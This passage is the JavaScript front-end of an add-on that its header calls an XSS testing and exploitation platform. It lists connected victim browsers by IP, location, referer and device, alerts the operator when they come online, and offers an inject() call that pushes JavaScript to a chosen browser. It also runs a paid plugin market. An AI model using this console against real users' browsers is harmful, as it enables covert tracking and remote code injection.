//
//  天干物燥 小心火烛
//      -- 《vae·等到烟火清凉》
//
//  开写于2015/05/24
//      一个几年前的想法+一年前的产品修改强化而成的xss测试与利用平台
//  我喜欢一边听歌一边写代码，还可能会不定时的在某个位置写下一点一滴的无趣。
//  或许 这也是一种享受。
//
;(function($, undefined) {
    var ADDON = {
        api: {
            //= 插件API
            api: function(plugin, socket, sid) {
                return $.extend({}, ANT.CONNECT_API.apis, {
                    listen: function(fn) {
                        this.end();
                        socket.on('plugin-listener', function(ret) {
                            (ret.sid === sid) ? fn(ret.data) : null;
                        });
                        return this;
                    },
                    //= 注入JS代码
                    inject: function(code) {
                        socket.emit('plugin-sender', sid, {
                            act: 'inject',
                            data: code
                        });
                        return this;
                    },
                    //= 发送数据到主机
                    send: function(data) {
                        socket.emit('plugin-listener', sid, data);
                        return this;
                    },
                    //= 删除socket事件
                    end: function() {
                        socket.removeEventListener('plugin-listener');
                    }
                });
            },
            //= 插件UI
            ui: function(plugin) {
                return {
                    //@ 窗口
                    popen: function(events) {
                        w2popup.open({
                            title: '<i class="fa fa-puzzle-piece"></i> ' + w2utils.encodeTags(plugin.name),
                            width: 650,
                            height: 500,
                            modal: true,
                            showMax: true,
                            style: 'padding: 0',
                            body: '<div id="bomb_hosts_loadplugin_div" style="width:100%;height:100%"></div>',
                            onOpen: function(event) {
                                event.onComplete = function() {
                                    events.open ? events.open('bomb_hosts_loadplugin_div') : null;
                                }
                            },
                            onClose: function(event) {
                                event.onComplete = function() {
                                    events.close ? events.close('bomb_hosts_loadplugin_div') : null;
                                }
                            },
                            onToggle: function(event) {
                                event.onComplete = function() {
                                    var obj = w2ui['bomb_hosts_loadplugin_div'];
                                    obj ? obj.resize() && obj.resize() : null;
                                    events.toggle ? events.toggle('bomb_hosts_loadplugin_div') : null;
                                }
                            }
                        });
                    },
                    //@ 关闭窗口
                    close: function() {
                        w2popup.close();
                    },
                    //@ 创建一个markdown编辑器
                    editor: function(div, writable) {
                        var editor = ace.edit(div),
                            mymode = require('ace/mode/' + (!writable ? 'markdown' : 'javascript')).Mode;
                        editor.setTheme('ace/theme/tomorrow');
                        !writable ? editor.setReadOnly(true) : null;
                        editor.session.setMode(new mymode());
                        editor.session.setUseWrapMode(true);
                        return editor;
                    },
                    //@ 锁定页面消息
                    //@ msg: 提示消息
                    //@ timeout: 超时时间，可选
                    //@ timeout_fn: 超时事件，可选
                    lock: function(msg, timeout, timeout_fn) {
                        var self = this;
                        w2popup.status === 'open' ? w2popup.lock(msg, true) : w2ui['layout'].lock('main', msg, true);
                        if (timeout) {
                            var tm = setTimeout(function() {
                                self.unlock();
                                    // .toastr.w('超时!');
                                timeout_fn ? timeout_fn() : null;
                            }, timeout);
                            return tm;
                        };
                        return this;
                    },
                    //@ 解锁页面消息
                    unlock: function(timer) {
                        w2popup.status === 'open' ? w2popup.unlock() : w2ui['layout'].unlock('main');
                        timer ? clearTimeout(timer) : null;
                        return this;
                    },
                    //@ 提示消息
                    toastr: ANT.CONNECT_API.apis.toastr
                }
            }
        },
        ui: {
            //= 主机列表
            grid_bomb_hosts: {
                name: 'grid_bomb_hosts',
                show: {
                    lineNumbers: true,
                    selectColumn: true,
                    footer: true,
                    toolbar: true,
                    expandColumn: true
                },
                multiSearch: false,
                columns: [
                    { field: '_id', hidden: true, caption: 'ID' },
                    { field: 'sid', hidden: true, caption: 'SID' },
                    { field: '_ctime', hidden: true, caption: 'CTIME' },
                    { field: 'project', caption: '所属项目', size: '6%', sortable: true },
                    { field: 'ip', caption: 'IP地址', size: '10%', sortable: true },
                    { field: 'addr', caption: '地理位置', size: '10%', sortable: true },
                    { field: 'referer', caption: '来源地址', size: '14%', sortable: true },
                    { field: 'os', caption: '设备信息', size: '15%', sortable: true },
                    { field: 'browser', caption: '浏览器信息', size: '10%', sortable: true },
                    { field: 'status', caption: '连接状态', size: '7%', sortable: true },
                    { field: 'ctime', caption: '连接时间', size: '13%', sortable: true },
                    { field: 'utime', caption: '断开时间', size: '13%', sortable: true }
                ],
                searches: [
                    { field: 'ip', caption: 'IP地址', type: 'text' },
                    { field: 'addr', caption: '地理位置', type: 'text' },
                    { field: 'referer', caption: '来源地址', type: 'text' },
                    { field: 'os', caption: '设备信息', type: 'text' },
                    { field: 'browser', caption: '浏览器信息', type: 'text' },
                    { field: 'status', caption: '连接状态', type: 'text' },
                    { field: 'ctime', caption: '连接时间', type: 'text' },
                    { field: 'utime', caption: '断开时间', type: 'text' }
                ],
                toolbar: {
                    items: [{
                        type: 'break'
                    }, {
                        id: 'view',
                        type: 'button',
                        disabled: true,
                        caption: '查看信息',
                        icon: 'fa fa-info-circle'
                    }, {
                        type: 'break'
                    }, {
                        id: 'data',
                        type: 'button',
                        disabled: true,
                        caption: '项目数据',
                        icon: 'fa fa-database'
                    }, {
                        type: 'break'
                    }, {
                        id: 'del',
                        type: 'button',
                        disabled: true,
                        caption: '删除主机',
                        icon: 'fa fa-trash-o'
                    }],
                    onClick: function(event) {
                        var ids = [],
                            self = w2ui['grid_bomb_hosts'];
                        self.getSelection().forEach(function(i) {
                            ids.push(self.get(i)._id);
                        })
                        var cur = self.get(self.getSelection()[0]);
                        switch(event.target) {
                            case 'del':
                                ADDON.hosts.del(ids);
                                break;
                            case 'view':
                                self.toggle(cur.recid);
                                break;
                            case 'data':
                                ADDON.hosts.data(ids[0]);
                                break;
                        }
                    }
                },
                onExpand: function(event) {
                    var host = ADDON.hosts.cache[this.get(event.recid)._id],
                        ua = w2utils.encodeTags(host.ua || ''),
                        referer = w2utils.encodeTags(host.referer || '');
                    $('#'+event.box_id).html(
                        '<div style="padding: 10px;height: auto;">' +
                        '[+] User-Agent: ' + ua + 
                        '<br>' +
                        '[+] Referer: <a target="_blank" href="' + referer + '">' + referer + '</a>' +
                        '</div>'
                    ).animate({
                        'height': 100
                    }, 100);
                },
                onSelect: function(event) {
                    var self = this;
                    event.onComplete = function() {
                        var ids = [],
                            cur = null;
                        self.getSelection().forEach(function(i) {
                            cur = self.get(i);
                            ids.push(cur._id);
                        });
                        self.toolbar.disable('view', 'data', 'plugin', 'del');
                        ids.length === 1
                        ? self.toolbar.enable('view', 'data', 'plugin', 'del')
                        : ids.length > 1
                            ? self.toolbar.enable('del')
                            : null;
                    }
                },
                onUnselect: function(event) {
                    this.onSelect(event);
                },
                onDblClick: function(event) {
                    this.toggle(event.recid);
                },
                onContextMenu: function(event) {
                    var self = this;
                    var openMenu = function() {
                        var selected = self.getSelection(),
                            current = self.get(selected[0]),
                            toolbar = self.toolbar,
                            plugins = ADDON.plugin.private.cache,
                            SUBMENU = [],
                            index = 1;
                        for (var p in plugins) {
                            SUBMENU.push({
                                id: p,
                                icon: 'fa fa-puzzle-piece',
                                text: w2utils.encodeTags(plugins[p].name),
                                action: function() {
                                    var _id = this.id.split('-')[0];
                                    ADDON.hosts.loadPlugin(_id, current.sid);
                                }
                            })
                            if (!(index % 5)) {
                                SUBMENU.push({
                                    divider: true
                                })
                            };
                            index ++;
                        }
                        $().bmenu([{
                            text: '查看信息',
                            icon: 'fa fa-info-circle',
                            disabled: selected.length !== 1,
                            action: function() {
                                toolbar.click('view');
                            }
                        }, {
                            text: '项目数据',
                            icon: 'fa fa-database',
                            disabled: selected.length !== 1,
                            action: function() {
                                toolbar.click('data');
                            }
                        }, {
                            divider: true
                        }, {
                            text: '加载插件',
                            icon: 'fa fa-folder-open-o',
                            disabled: (selected.length !== 1) || (current.status !== '在线') || (SUBMENU.length === 0),
                            subMenu: SUBMENU
                        }, {
                            divider: true
                        }, {
                            text: '删除主机',
                            icon: 'fa fa-trash-o',
                            count: selected.length,
                            action: function() {
                                toolbar.click('del');
                            }
                        }], event.originalEvent);
                    }
                    //= 获取插件列表
                    if (!ADDON.plugin.private.cache) {
                        ADDON.plugin.private.refresh(function() {
                            openMenu();
                        });
                    }else{
                        openMenu();
                    }
                }
            },
            //= 项目列表
            grid_bomb_project: {
                name: 'grid_bomb_project',
                show: {
                    lineNumbers: true,
                    selectColumn: true,
                    footer: true,
                    toolbar: true,
                    expandColumn: true
                },
                multiSearch: false,
                columns: [
                    { field: '_id', hidden: true, caption: 'ID' },
                    { field: '_ctime', hidden: true, caption: 'CTIME' },
                    { field: 'name', caption: '项目名称', size: '25%', sortable: true },
                    { field: 'link', caption: '项目地址', size: '45%', sortable: true },
                    { field: 'ctime', caption: '创建时间', size: '15%', sortable: true },
                    { field: 'utime', caption: '更新时间', size: '15%', sortable: true }
                ],
                searches: [
                    { field: 'name', caption: '项目名称', type: 'text' },
                    { field: 'link', caption: '项目地址', type: 'text' },
                    { field: 'ctime', caption: '连接时间', type: 'text' },
                    { field: 'utime', caption: '断开时间', type: 'text' }
                ],
                toolbar: {
                    items: [{
                        type: 'break'
                    }, {
                        id: 'add',
                        type: 'button',
                        caption: '添加项目',
                        icon: 'fa fa-plus-circle'
                    }, {
                        type: 'break'
                    }, {
                        id: 'desc',
                        type: 'button',
                        disabled: true,
                        caption: '项目简介',
                        icon: 'fa fa-info-circle'
                    }, {
                        type: 'break'
                    }, {
                        id: 'view',
                        type: 'button',
                        disabled: true,
                        caption: '浏览项目',
                        icon: 'fa fa-eye'
                    }, {
                        type: 'break'
                    }, {
                        id: 'reset',
                        type: 'button',
                        caption: '更改设置',
                        disabled: true,
                        icon: 'fa fa-cog'
                    }, {
                        type: 'break'
                    }, {
                        id: 'edit',
                        type: 'button',
                        caption: '编辑项目',
                        disabled: true,
                        icon: 'fa fa-edit'
                    }, {
                        type: 'break'
                    }, {
                        id: 'del',
                        type: 'button',
                        disabled: true,
                        caption: '删除项目',
                        icon: 'fa fa-trash-o'
                    }],
                    onClick: function(event) {
                        var ids = [],
                            self = w2ui['grid_bomb_project'];
                        self.getSelection().forEach(function(i) {
                            ids.push(self.get(i)._id);
                        })
                        var cur = self.get(self.getSelection()[0]);
                        switch(event.target) {
                            case 'add':
                                ADDON.project.add();
                                break;
                            case 'desc':
                                self.toggle(cur.recid);
                                break;
                            case 'view':
                                window.open(cur.link, '_blank');
                                break;
                            case 'reset':
                                ADDON.project.reset(ids[0]);
                                break;
                            case 'del':
                                ADDON.project.del(ids);
                                break;
                            case 'edit':
                                ADDON.project.edit(ids[0]);
                                break;
                        }
                    }
                },
                onExpand: function(event) {
                    var project = ADDON.project.cache[this.get(event.recid)._id];
                    $('#'+event.box_id).html(
                        '<div style="padding: 10px;height: auto;">' + (w2utils.encodeTags(project.desc || '<暂无简介>')).replace(/\n/g, '<br>') + '</div>'
                    ).animate({
                        'height': 100
                    }, 100);
                },
                onSelect: function(event) {
                    var self = this;
                    event.onComplete = function() {
                        var ids = [],
                            cur = null;
                        self.getSelection().forEach(function(i) {
                            cur = self.get(i);
                            ids.push(cur._id);
                        });
                        self.toolbar.disable('desc', 'del', 'edit', 'reset', 'view');
                        ids.length === 1
                        ? self.toolbar.enable('desc', 'del', 'edit', 'reset', 'view')
                        : ids.length > 1
                            ? self.toolbar.enable('del')
                            : null;
                    }
                },
                onUnselect: function(event) {
                    this.onSelect(event);
                },
                onContextMenu: function(event) {
                    var selected = this.getSelection(),
                        current = this.get(selected[0]),
                        toolbar = this.toolbar;
                    $().bmenu([
                        {
                            text: '项目简介',
                            icon: 'fa fa-info-circle',
                            disabled: selected.length !== 1,
                            action: function() {
                                toolbar.click('desc');
                            }
                        }, {
                            text: '浏览项目',
                            icon: 'fa fa-eye',
                            disabled: selected.length !== 1,
                            action: function() {
                                toolbar.click('view');
                            }
                        }, {
                            divider: true
                        }, {
                            text: '编辑项目',
                            icon: 'fa fa-edit',
                            disabled: selected.length !== 1,
                            action: function() {
                                toolbar.click('edit');
                            }
                        }, {
                            text: '更改设置',
                            icon: 'fa fa-cog',
                            disabled: selected.length !== 1,
                            action: function() {
                                toolbar.click('reset');
                            }
                        }, {
                            divider: true
                        }, {
                            text: '删除插件',
                            icon: 'fa fa-trash-o',
                            count: selected.length,
                            disabled: selected.length === 0,
                            action: function() {
                                toolbar.click('del');
                            }
                        }
                    ], event.originalEvent);
                },
                onDblClick: function(event) {
                    this.toggle(event.recid);
                }
            },
            //= 共有插件
            grid_bomb_plugin_public: {
                name: 'grid_bomb_plugin_public',
                show: {
                    lineNumbers: true,
                    footer: true,
                    toolbar: true,
                    expandColumn: true
                },
                multiSearch: false,
                multiSelect: false,
                columns: [
                    { field: '_id', hidden: true, caption: 'ID' },
                    { field: '_utime', hidden: true, caption: 'UTIME' },
                    { field: 'name', caption: '插件名称', size: '45%', sortable: true },
                    { field: 'user', caption: '插件作者', size: '20%', sortable: true },
                    { field: 'coin', caption: '出售蚁币', size: '10%', sortable: true },
                    { field: 'buys', caption: '购买次数', size: '10%', sortable: true },
                    { field: 'utime', caption: '更新时间', size: '15%', sortable: true }
                ],
                searches: [
                    { field: 'name', caption: '插件名称', type: 'text' },
                    { field: 'user', caption: '插件作者', type: 'text' },
                    { field: 'coin', caption: '出售蚁币', type: 'text' },
                    { field: 'buys', caption: '购买次数', type: 'text' },
                    { field: 'utime', caption: '更新时间', type: 'text' }
                ],
                toolbar: {
                    items: [{
                        type: 'break'
                    }, {
                        id: 'desc',
                        type: 'button',
                        disabled: true,
                        caption: '插件简介',
                        icon: 'fa fa-info-circle'
                    }, {
                        type: 'break'
                    }, {
                        id: 'comment',
                        type: 'button',
                        disabled: true,
                        caption: '插件交流',
                        icon: 'fa fa-comments'
                    }, {
                        type: 'break'
                    }, {
                        id: 'buy',
                        type: 'button',
                        disabled: true,
                        caption: '购买插件',
                        icon: 'fa fa-money'
                    }],
                    onClick: function(event) {
                        var self = w2ui['grid_bomb_plugin_public'],
                            cur = self.get(self.getSelection()[0]);
                        switch(event.target) {
                            case 'desc':
                                self.toggle(cur.recid);
                                break;
                            case 'comment':
                                ADDON.plugin.public.comment(cur._id);
                                break;
                            case 'buy':
                                ADDON.plugin.public.buy(cur._id);
                                break;
                        }
                    }
                },
                onSelect: function(event) {
                    var self = this;
                    event.onComplete = function() {
                        self.getSelection().length === 1
                        ? self.toolbar.enable('desc', 'comment', 'buy')
                        : self.toolbar.disable('desc', 'comment', 'buy');
                    }
                },
                onUnselect: function(event) {
                    this.onSelect(event);
                },
                onExpand: function(event) {
                    var plugin = ADDON.plugin.public.cache[this.get(event.recid)._id];
                    $('#'+event.box_id).html(
                        '<div style="padding: 10px;height: auto;">' + (w2utils.encodeTags(plugin.desc || '<暂无简介>')).replace(/\n/g, '<br>') + '</div>'
                    ).animate({
                        'height': 100
                    }, 100);
                },
                onContextMenu: function(event) {
                    var toolbar = w2ui['grid_bomb_plugin_public'].toolbar;
                    $().bmenu([{
                        text: '购买插件',
                        icon: 'fa fa-money',
                        action: function() {
                            toolbar.click('buy');
                        }
                    }, {
                        divider: true
                    }, {
                        text: '插件简介',
                        icon: 'fa fa-info-circle',
                        action: function() {
                            toolbar.click('desc');
                        }
                    }, {
                        divider: true
                    }, {
                        text: '插件交流',
                        icon: 'fa fa-comments',
                        action: function() {
                            toolbar.click('comment');
                        }
                    }], event.originalEvent);
                },
                onDblClick: function(event) {
                    this.toggle(event.recid);
                }
            },
            //= 私有插件
            grid_bomb_plugin_private: {
                name: 'grid_bomb_plugin_private',
                show: {
                    lineNumbers: true,
                    selectColumn: true,
                    footer: true,
                    toolbar: true,
                    expandColumn: true
                },
                multiSearch: false,
                columns: [
                    { field: '_id', hidden: true, caption: 'ID' },
                    { field: '_ctime', hidden: true, caption: 'CTIME' },
                    { field: 'name', caption: '插件名称', size: '50%', sortable: true },
                    { field: 'public', caption: '是否出售', size: '10%', sortable: true },
                    { field: 'verify', caption: '是否审核', size: '10%', sortable: true },
                    { field: 'ctime', caption: '创建时间', size: '15%', sortable: true },
                    { field: 'utime', caption: '更新时间', size: '15%', sortable: true }
                ],
                searches: [
                    { field: 'name', caption: '插件名称', type: 'text' },
                    { field: 'public', caption: '是否出售', type: 'text' },
                    { field: 'verify', caption: '是否审核', type: 'text' },
                    { field: 'ctime', caption: '创建时间', type: 'text' },
                    { field: 'utime', caption: '更新时间', type: 'text' }
                ],
                toolbar: {
                    items: [{
                        type: 'break'
                    }, {
                        id: 'add',
                        type: 'button',
                        caption: '添加插件',
                        icon: 'fa fa-plus-circle'
                    }, {
                        type: 'break'
                    }, {
                        id: 'desc',
                        type: 'button',
                        caption: '插件简介',
                        disabled: true,
                        icon: 'fa fa-info-circle'
                    }, {
                        type: 'break'
                    }, {
                        id: 'edit',
                        type: 'button',
                        caption: '编辑插件',
                        disabled: true,
                        icon: 'fa fa-edit'
                    }, {
                        type: 'break'
                    }, {
                        id: 'reset',
                        type: 'button',
                        caption: '更改设置',
                        disabled: true,
                        icon: 'fa fa-cog'
                    }, {
                        type: 'break'
                    }, {
                        id: 'sell',
                        type: 'button',
                        caption: '出售插件',
                        disabled: true,
                        icon: 'fa fa-money'
                    }, {
                        type: 'break'
                    }, {
                        id: 'cancel',
                        type: 'button',
                        caption: '取消出售',
                        disabled: true,
                        icon: 'fa fa-remove'
                    }, {
                        type: 'break'
                    }, {
                        id: 'del',
                        type: 'button',
                        caption: '删除插件',
                        disabled: true,
                        icon: 'fa fa-trash-o'
                    }],
                    onClick: function(event) {
                        var ids = [],
                            self = w2ui['grid_bomb_plugin_private'];
                        self.getSelection().forEach(function(i) {
                            ids.push(self.get(i)._id);
                        })
                        var cur = self.get(self.getSelection()[0]);
                        switch(event.target) {
                            case 'add':
                                ADDON.plugin.private.add();
                                break;
                            case 'desc':
                                self.toggle(cur.recid);
                                break;
                            case 'del':
                                ADDON.plugin.private.del(ids);
                                break;
                            case 'edit':
                                ADDON.plugin.private.edit(ids[0]);
                                break;
                            case 'reset':
                                ADDON.plugin.private.reset(ids[0]);
                                break;
                            case 'sell':
                                ADDON.plugin.private.sell(ids[0]);
                                break;
                            case 'cancel':
                                ADDON.plugin.private.cancel(ids[0]);
                                break;
                        }
                    }
                },
                onSelect: function(event) {
                    var self = this;
                    event.onComplete = function() {
                        var ids = [],
                            cur = null;
                        self.getSelection().forEach(function(i) {
                            cur = self.get(i);
                            ids.push(cur._id);
                        });
                        self.toolbar.disable('desc', 'del', 'edit', 'reset', 'sell', 'cancel');
                        ids.length === 1
                        ? (self.toolbar.enable('desc', 'del', 'edit', 'reset', 'sell', 'cancel') && self.toolbar.disable(cur.public !== '是' ? 'cancel' : 'sell'))
                        : ids.length > 1
                            ? self.toolbar.enable('del')
                            : null;
                    }
                },
                onUnselect: function(event) {
                    this.onSelect(event);
                },
                onExpand: function(event) {
                    var plugin = ADDON.plugin.private.cache[this.get(event.recid)._id];
                    $('#'+event.box_id).html(
                        '<div style="padding: 10px;height: auto;">' + (w2utils.encodeTags(plugin.desc || '<暂无简介>')).replace(/\n/g, '<br>') + '</div>'
                    ).animate({
                        'height': 100
                    }, 100);
                },
                onDblClick: function(event) {
                    this.toggle(event.recid);
                },
                onContextMenu: function(event) {
                    var selected = this.getSelection(),
                        current = this.get(selected[0]),
                        toolbar = w2ui['grid_bomb_plugin_private'].toolbar;
                    $().bmenu([
                        {
                            text: '插件简介',
                            icon: 'fa fa-info-circle',
                            disabled: selected.length !== 1,
                            action: function() {
                                toolbar.click('desc');
                            }
                        }, {
                            divider: true
                        }, {
                            text: '编辑插件',
                            icon: 'fa fa-edit',
                            disabled: selected.length !== 1,
                            action: function() {
                                toolbar.click('edit');
                            }
                        }, {
                            text: '更改设置',
                            icon: 'fa fa-cog',
                            disabled: selected.length !== 1,
                            action: function() {
                                toolbar.click('reset');
                            }
                        }, {
                            divider: true
                        }, {
                            text: '出售插件',
                            icon: 'fa fa-money',
                            disabled: (selected.length !== 1) || (current.public === '是'),
                            action: function() {
                                toolbar.click('sell');
                            }
                        }, {
                            text: '取消插件',
                            icon: 'fa fa-remove',
                            disabled: (selected.length !== 1) || (current.public === '否'),
                            action: function() {
                                toolbar.click('cancel');
                            }
                        }, {
                            divider: true
                        }, {
                            text: '删除插件',
                            icon: 'fa fa-trash-o',
                            count: selected.length,
                            disabled: selected.length === 0,
                            action: function() {
                                toolbar.click('del');
                            }
                        }
                    ], event.originalEvent);
                },
            },
            //= 私有插件:添加修改
            form_bomb_plugin_private: {
                name: 'form_bomb_plugin_private',
                style: 'height: 100%;border: 0px;background-color: transparent;',
                fields: [
                    {
                        field: 'name',
                        type: 'text',
                        required: true,
                        html: {
                            caption: '插件名称',
                            attr: 'style="width: 250px"'
                        }
                    }, {
                        field: 'desc',
                        type: 'textarea',
                        html: {
                            caption: '插件简介',
                            attr: 'rows="8" style="width: 250px;"'
                        }
                    }
                ]
            },
            //= 私有插件:出售插件
            form_bomb_plugin_private_sell: {
                name: 'form_bomb_plugin_private_sell',
                style: 'height: 100%;border: 0px;background-color: transparent;',
                fields: [{
                    field: 'coin',
                    type: 'int',
                    required: true,
                    html: {
                        caption: '出售蚁币',
                        attr: 'style="width: 180px;"'
                    }
                }],
                actions: {
                    'Submit': function() {}
                }
            },
            //= 私有插件:编辑插件
            layout_bomb_plugin_private_edit: {
                name: 'layout_bomb_plugin_private_edit',
                panels: [{
                    size: '100%',
                    type: 'main',
                    style: 'border: 1px solid #dfdfdf;',
                    content: '' +
                    '<div id="layout_bomb_plugin_private_edit_client" class="bomb_editor" style="width: 100%;height:100%;font-size: 14px;"></div>' +
                    '<div id="layout_bomb_plugin_private_edit_server" class="bomb_editor" style="width: 100%;height:100%;font-size: 14px;"></div>',
                    resizable: true,
                    toolbar: {
                        items: [{
                            id: 'save',
                            icon: 'fa fa-save',
                            hint: '[Ctrl || Command] + S',
                            type: 'button',
                            caption: '保存'
                        }, {
                            type: 'break'
                        }],
                    },
                    tabs: {
                        tabs: [{
                            id: 'client',
                            caption: '<i class="fa fa-code"></i> 客户端'
                        }, {
                            id: 'server',
                            caption: '<i class="fa fa-skyatlas"></i> 服务端'
                        }],
                        onClick: function(event) {
                            $('.bomb_editor').hide();
                            $('#layout_bomb_plugin_private_edit_' + event.target).show();
                            ADDON.plugin.private.editor[event.target].resize();
                        }
                    }
                }]
            },
            //= 添加项目表单
            form_bomb_project: {
                name: 'form_bomb_project',
                style: 'height: 100%;border: 0px;background-color: transparent;',
                fields: [
                    {
                        field: 'name',
                        type: 'text',
                        required: true,
                        html: {
                            caption: '项目名称',
                            attr: 'style="width: 250px"'
                        }
                    }, {
                        field: 'desc',
                        type: 'textarea',
                        html: {
                            caption: '项目简介',
                            attr: 'rows="8" style="width: 250px;"'
                        }
                    }
                ]
            },
            //= 编辑项目
            layout_bomb_project_edit: {
                name: 'layout_bomb_project_edit',
                panels: [{
                    type: 'main',
                    size: '100%',
                    style: 'border: 1px solid #dfdfdf;',
                    content: '<div id="layout_bomb_project_edit_div" style="font-size:14px;width: 100%;height: 100%;"></div>',
                    toolbar: {
                        items: [{
                            id: 'save',
                            caption: '保存',
                            type: 'button',
                            icon: 'fa fa-save'
                        }, {
                            type: 'break'
                        }, {
                            id: 'plugin',
                            caption: '插入插件',
                            type: 'menu',
                            icon: 'fa fa-folder-open-o',
                            items: []
                        }]
                    }
                }]
            },
            //＝ 通知设置
            form_bomb_notify: {
                name: 'form_bomb_notify',
                fields: [
                // {
                //     field: 'sendmail',
                //     type: 'checkbox',
                //     html: {
                //         caption: '邮件提醒(下次生效)'
                //     }
                // }, 
                {
                    field: 'notify',
                    type: 'checkbox',
                    html: {
                        caption: '桌面通知',
                    }
                }, {
                    field: 'toastr',
                    type: 'checkbox',
                    html: {
                        caption: '页面提示'
                    }
                }, {
                    field: 'audio_online',
                    type: 'text',
                    html: {
                        caption: '上线提示声音',
                        attr: 'style="width:90%"'
                    }
                }, {
                    field: 'audio_offline',
                    type: 'text',
                    html: {
                        caption: '下线提示声音',
                        attr: 'style="width:90%"'
                    }
                }],
                toolbar: {
                    items: [{
                        id: 'save',
                        type: 'button',
                        caption: '保存',
                        icon: 'fa fa-save',
                        onClick: function() {
                            ADDON.setting.set(w2ui['form_bomb_notify'].record);
                            ADDON.success('设置保存成功!');
                            w2popup.close();
                        }
                    }, {
                        type: 'break'
                    }]
                }
            }
        },
        socket: null,
        init: function() {
            var self = this;
            //= 初始化UI
            $().w2grid(self.ui.grid_bomb_hosts);
            $().w2grid(self.ui.grid_bomb_project);
            $().w2grid(self.ui.grid_bomb_plugin_public);
            $().w2grid(self.ui.grid_bomb_plugin_private);
            $().w2layout(self.ui.layout_bomb_plugin_private_edit);
            $().w2layout(self.ui.layout_bomb_project_edit);
            $().w2form(self.ui.form_bomb_notify);
            //  初始化本地设置

            //= 注册启动事件
            ANT.addonLoaded.reg(function() {
                ADDON.hosts.init();
            })
        },
        hosts: {
            //= 缓冲数据
            cache: null,
            onlines: {},
            //= 初始化连接服务器
            init: function() {
                var self = this;
                ADDON.lock('连接服务器中..');
                $.get('/addons/ant.bomb/hosts/init', function(uid) {
                    //= 初始化SOCK.io
                    ADDON.socket = io.connect(document.URL);
                    ADDON.socket
                    .on('connect', function() {
                        this.emit('client', uid);
                    })
                    //= 断开连接
                    .on('disconnect', function() {
                        this.close();
                        ADDON.error('服务器断开连接!');
                        setTimeout(function() {
                            location.reload();
                        }, 1000);
                    })
                    //= 连接配对成功
                    .on('init', function(status) {
                        ADDON.unlock();
                        status ? ADDON.success('连接服务器成功!') : ADDON.error('连接服务器失败!');
                    })
                    //= 主机上线事件
                    .on('online', function(ret) {
                        var host = ret.host,
                            project = ret.project,
                            setting = ADDON.setting.get();
                        // if (self.cache && self.cache[host._id] && self.cache[host._id].online === true) {
                        //     return false;
                        // };
                        if (self.onlines[host._id]) {
                            return false;
                        };
                        self.onlines[host._id] = true;
                        //  toatr提示
                        if (setting.toastr) {
                            ADDON.info('有主机(' + w2utils.encodeTags(host.ip) + ')上线!', false, function() {
                                w2ui['sidebar'].click('bomb_hosts');
                            });
                        };
                        //  notify提示
                        if (setting.notify) {
                            ANT.CONNECT_API.apis.notify({
                                title: '有主机上线!',
                                body: 'IP: ' + host.ip + '\n地址: ' + host.addr,
                                audio: setting.audio_online,
                                click: function() {
                                    w2ui['sidebar'].click('bomb_hosts');
                                }
                            })
                        };
                        //  上线声音
                        if (setting.toastr && setting.audio_offline && !setting.notify) {
                            var _audio = document.createElement('audio');
                            _audio.src = setting.audio_online || '/ant/res/online.wav';
                            _audio.play();
                            _audio.remove();
                        }

                        host.project = {
                            _id: host.project,
                            name: project
                        }
                        self.cache ? (self.cache[host._id] = host) & self.reload() : null;
                    })
                    //= 主机下线事件
                    .on('offline', function(host) {
                        var setting = ADDON.setting.get();
                        if (self.cache && self.cache[host._id] && self.cache[host._id].online === false) {
                            return false;
                        };
                        //  toatr提示
                        if (setting.toastr) {
                            ADDON.warning('有主机(' + w2utils.encodeTags(host.ip) + ')下线!', false, function() {
                                w2ui['sidebar'].click('bomb_hosts');
                            });
                        }
                        //  notify提示
                        if (setting.notify) {
                            ANT.CONNECT_API.apis.notify({
                                title: '有主机下线!',
                                body: 'IP: ' + host.ip + '\n地址: ' + host.addr,
                                audio: setting.audio_offline,
                            })
                        };
                        //  上线声音
                        if (setting.toastr && setting.audio_offline && !setting.notify) {
                            var _audio = document.createElement('audio');
                            _audio.src = setting.audio_offline || '/ant/res/offline.wav';
                            _audio.play();
                            _audio.remove();
                        }
                        self.cache ? (self.cache[host._id].online = false) & (self.cache[host._id].utime = new Date()) & self.reload() : null;
                    })
                    .on('data', function(data) {
                        console.log('data--', data);
                    })
                })
            },
            //= 刷新数据
            refresh: function() {
                var self = this;
                ADDON.content(w2ui['grid_bomb_hosts']);
                if (!self.cache) {
                    self.cache = {};
                    ADDON.lock('加载主机数据中..')
                    $.get('/addons/ant.bomb/hosts/data', function(data) {
                        if (data.err) {
                            ADDON.unlock();
                            ADDON.error('加载数据失败!<br>' + data.err);
                        }else{
                            data.ret.forEach(function(i) {
                                self.cache[i._id] = i;
                            });
                            self.reload();
                        }
                    })
                }
            },
            //= 刷新UI
            reload: function() {
                var self = this,
                    records = [],
                    index = 0;
                for (var i in self.cache) {
                    var host = self.cache[i],
                        ua = self.parseUA(host.ua);
                    if (host) {
                        records.push({
                            recid: records.length + 1,
                            _id: host._id,
                            sid: host.sid,
                            project: w2utils.encodeTags(host.project ? (host.project.name || 'null') : '[已删除]'),
                            ip: w2utils.encodeTags(host.ip),
                            addr: w2utils.encodeTags(host.addr),
                            referer: w2utils.encodeTags(host.referer),
                            os: w2utils.encodeTags(ua.os),
                            browser: w2utils.encodeTags(ua.browser),
                            status: host.online ? '在线' : '离线',
                            ctime: ANT.ftime(host.ctime),
                            _ctime: host.ctime,
                            utime: host.online ? '-' : ANT.ftime(host.utime),
                            style: host.online ? 'color:rgb(195, 45, 9);background-color:#FBFEC0;' : ''
                        });
                        host.online ? index ++ : null;
                    };
                }
                w2ui['grid_bomb_hosts'].records = records;
                w2ui['grid_bomb_hosts'].sort('_ctime', 'desc');
                w2ui['grid_bomb_hosts'].refresh();
                setTimeout(function() {
                    w2ui.sidebar.set('bomb_hosts', {
                        count: index + '/' + records.length
                    });
                    ADDON.unlock();
                }, 100);
            },
            //= 解析ua
            parseUA: function(ua) {
                var info = {};
                var temp = {};
                info.ua = ua;
                temp.os = {
                    'Mac OS X': /Mac OS X ([\d\.\_]+)/,
                    'iPhone OS': /iPhone OS ([\d\.\_]+)/,
                    'iPad': /iPad; CPU OS ([\d\_\.]+)/,
                    'Android': /Android ([\d\.]+)/,
                    'Windows Phone': /Windows Phone (OS )?([\d\.]+)/,
                    'BlackBerry': /BlackBerry[ ]?[\d]+/,
                    'Symbian': /SymbianOS\/([\d\.]+)/,
                    'Windows': /Windows NT ([\d\.]+)/,
                    'Linux': /Linux ([\w\d]+)/
                }
                for (var o in temp.os){
                    if (info.ua.indexOf(o)) {
                        var m = info.ua.match(temp.os[o]);
                        info.os = m ? m[0] : (info.os || 'Unknow OS');
                    };
